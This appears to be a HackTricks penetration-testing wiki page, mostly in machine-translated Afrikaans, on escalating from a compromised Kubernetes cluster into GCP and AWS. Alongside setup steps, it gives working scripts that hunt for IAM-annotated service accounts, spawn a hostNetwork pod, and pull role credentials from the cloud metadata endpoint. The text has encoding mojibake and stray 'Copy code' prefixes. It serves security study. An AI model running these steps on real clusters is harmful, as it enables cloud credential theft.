# Kubernetes Pivoting to Clouds

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## GCP

As jy 'n k8s-kluster binne GCP bestuur, wil jy waarskynlik h√™ dat 'n toepassing wat binne die kluster loop, toegang tot GCP het. Daar is 2 algemene maniere om dit te doen:

### GCP-SA sleutels as geheim monteer

'n Algemene manier om **toegang aan 'n kubernetes-toepassing tot GCP** te gee, is om:

* 'n GCP-diensrekening te skep
* Die gewenste toestemmings daarop te bind
* 'n json-sleutel van die geskepte SA af te laai
* Dit as 'n geheim binne die pod te monteer
* Stel die GOOGLE\_APPLICATION\_CREDENTIALS omgewing veranderlike in wat na die pad waar die json is, wys.

{% hint style="warning" %}
Daarom, as 'n **aanvaller**, as jy 'n houer binne 'n pod kompromitteer, moet jy kyk vir daardie **omgewing** **veranderlike** en **json** **l√™ers** met GCP-akkrediteer.
{% endhint %}

### GSA json aan KSA geheim te verbind

'n Manier om toegang aan 'n GSA tot 'n GKE-kluster te gee, is deur hulle op hierdie manier te bind:

* Skep 'n Kubernetes-diensrekening in dieselfde naamruimte as jou GKE-kluster met die volgende opdrag:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* Skep 'n Kubernetes Secret wat die geloofsbriewe van die GCP-diensrekening bevat waartoe jy toegang tot die GKE-kluster wil verleen. Jy kan dit doen met die `gcloud` opdraglyn hulpmiddel, soos in die volgende voorbeeld getoon:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* Bind die Kubernetes Secret aan die Kubernetes diensrekening met die volgende opdrag:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
In die **tweede stap** is die **bewyse van die GSA as geheim van die KSA** gestel. Dan, as jy daardie geheim kan **lees** van **binne** die **GKE** kluster, kan jy **eskaleer na daardie GCP diensrekening**.
{% endhint %}

### GKE Werklasidentiteit

Met Werklasidentiteit kan ons 'n [Kubernetes diensrekening](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) konfigureer om op te tree as 'n [Google diensrekening](https://cloud.google.com/iam/docs/understanding-service-accounts). Pods wat met die Kubernetes diensrekening loop, sal outomaties as die Google diensrekening autentiseer wanneer hulle toegang tot Google Cloud API's verkry.

Die **eerste reeks stappe** om hierdie gedrag te aktiveer is om **Werklasidentiteit in GCP** te **aktiveer** ([**stappe**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) en die GCP SA te skep wat jy wil h√™ k8s moet naboots.

* **Aktiveer Werklasidentiteit** op 'n nuwe kluster

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **Skep/Opdateer 'n nuwe nodepool** (Autopilot-klusters het dit nie nodig nie)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* Skep die **GCP-diensrekening om te verteenwoordig** vanaf K8s met GCP-toestemmings:

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **Verbind** met die **kluster** en **skep** die **diensrekening** om te gebruik

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **Bind die GSA met die KSA**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* Voer 'n **pod** uit met die **KSA** en kontroleer die **toegang** tot die **GSA:**
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
Kontroleer die volgende opdrag om te autentiseer indien nodig:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
As 'n aanvaller binne K8s moet jy **soek na SA's** met die **`iam.gke.io/gcp-service-account` annotasie** aangesien dit aandui dat die SA toegang tot iets in GCP kan h√™. 'n Ander opsie sou wees om te probeer om elke KSA in die kluster te misbruik en te kyk of dit toegang het.\
Van GCP is dit altyd interessant om die bindings te tel en te weet **watter toegang jy aan SA's binne Kubernetes gee**.
{% endhint %}

This is a script to easily **iterate over the all the pods** definitions **looking** for that **annotation**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (IAM-rol vir Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

'n (verouderde) manier om IAM-rolle aan Pods te gee, is om 'n [**Kiam**](https://github.com/uswitch/kiam) of 'n [**Kube2IAM**](https://github.com/jtblin/kube2iam) **bediener** te gebruik. Basies moet jy 'n **daemonset** in jou kluster hardloop met 'n **soort bevoorregte IAM-rol**. Hierdie daemonset sal die een wees wat toegang tot IAM-rolle aan die pods wat dit nodig het, sal gee.

Eerstens moet jy **watter rolle binne die naamruimte toeganklik is, konfigureer**, en jy doen dit met 'n annotasie binne die naamruimte objek: 

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

Sodra die naamruimte geconfigureer is met die IAM rolle wat die Pods kan h√™, kan jy **die rol wat jy op elke pod-definisie wil h√™, aandui met iets soos**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
As 'n aanvaller, as jy **hierdie annotasies** in pods of namespaces of 'n kiam/kube2iam bediener wat loop (waarskynlik in kube-system) vind, kan jy **alle r**ole wat reeds **deur pods** gebruik word, en meer **naboots** (as jy toegang het tot die AWS-rekening, tel die rolle op).
{% endhint %}

#### Skep Pod met IAM Rol

{% hint style="info" %}
Die IAM rol wat aangedui moet word, moet in dieselfde AWS-rekening wees as die kiam/kube2iam rol en daardie rol moet in staat wees om dit te benader.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM Rol vir K8s Diens Rekeninge via OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Dit is die **aanbevole manier deur AWS**.

1. Eerstens moet jy [‚Äòn OIDC-verskaffer vir die kluster skep](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Dan skep jy ‚Äòn IAM rol met die toestemmings wat die SA benodig.
3. Skep ‚Äòn [vertrouensverhouding tussen die IAM rol en die SA](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) naam (of die namespaces wat toegang tot die rol aan al die SAs van die namespace gee). _Die vertrouensverhouding sal hoofsaaklik die OIDC-verskaffer naam, die namespace naam en die SA naam nagaan_.
4. Laastens, **skep ‚Äòn SA met ‚Äòn annotasie wat die ARN van die rol aandui**, en die pods wat met daardie SA loop, sal **toegang h√™ tot die token van die rol**. Die **token** is **geskryf** binne ‚Äòn l√™er en die pad is gespesifiseer in **`AWS_WEB_IDENTITY_TOKEN_FILE`** (standaard: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
Om **aws te kry met die token** van `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`, voer uit: 

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
As 'n aanvaller, as jy 'n K8s-kluster kan opnoem, kyk vir **diensrekeninge met daardie annotasie** om **op te skaal na AWS**. Om dit te doen, net **exec/create** 'n **pod** met een van die IAM **bevoorregte diensrekeninge** en steel die token.

Boonop, as jy binne 'n pod is, kyk vir omgewingsveranderlikes soos **AWS\_ROLE\_ARN** en **AWS\_WEB\_IDENTITY\_TOKEN.**
{% endhint %}

{% hint style="danger" %}
Soms mag die **Vertrouensbeleid van 'n rol** **sleg geconfigureer** wees en in plaas daarvan om AssumeRole-toegang aan die verwagte diensrekening te gee, gee dit dit aan **alle diensrekeninge**. Daarom, as jy in staat is om 'n annotasie op 'n beheerde diensrekening te skryf, kan jy toegang tot die rol verkry.

Kyk na die **volgende bladsy vir meer inligting**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### Vind Pods 'n SAs met IAM Rolle in die Kluster

Dit is 'n skrip om maklik **oor al die pods en sas** definisies **te herhaal** op soek na daardie **annotasie**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### Node IAM Rol

Die vorige afdeling was oor hoe om IAM Rolle met pods te steel, maar let daarop dat 'n **Node van die** K8s-kluster 'n **instansie binne die wolk** gaan wees. Dit beteken dat die Node hoogs waarskynlik 'n **nuwe IAM rol gaan h√™ wat jy kan steel** (_let daarop dat gewoonlik al die nodes van 'n K8s-kluster dieselfde IAM rol sal h√™, so dit mag nie die moeite werd wees om op elke node te probeer kyk_).

Daar is egter 'n belangrike vereiste om toegang tot die metadata-eindpunt vanaf die node te verkry, jy moet in die node wees (ssh-sessie?) of ten minste dieselfde netwerk h√™:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### Steal IAM Role Token

Previously we have discussed how to **attach IAM Roles to Pods** or even how to **escape to the Node to steal the IAM Role** the instance has attached to it.

You can use the following script to **steal** your new hard worked **IAM role credentials**:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## Verwysings

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
